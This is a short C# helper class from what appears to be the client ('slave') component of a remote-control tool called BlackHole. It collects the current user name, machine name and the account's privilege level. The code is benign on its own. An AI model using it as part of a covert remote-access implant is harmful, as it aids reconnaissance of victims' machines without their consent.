using System;
using System.Security.Principal;

namespace BlackHole.Slave.Helper
{
    public static class WindowsHelper
    {
        static WindowsHelper()
        {
            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity != null)
                {
                    AccountType = "Unknow";
                    var principal = new WindowsPrincipal(identity);
                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        AccountType = "Admin";
                    else if (principal.IsInRole(WindowsBuiltInRole.User))
                        AccountType = "User";
                    else if (principal.IsInRole(WindowsBuiltInRole.Guest))
                        AccountType = "Guest";
                }
            }
            UserName = Environment.UserName + $" ({AccountType})";
            MachineName = Environment.MachineName;
        }

        public static string UserName
        {
            get;
        }
        public static string MachineName
        {
            get;
        }
        public static string AccountType
        {
            get;
        }
    }
}
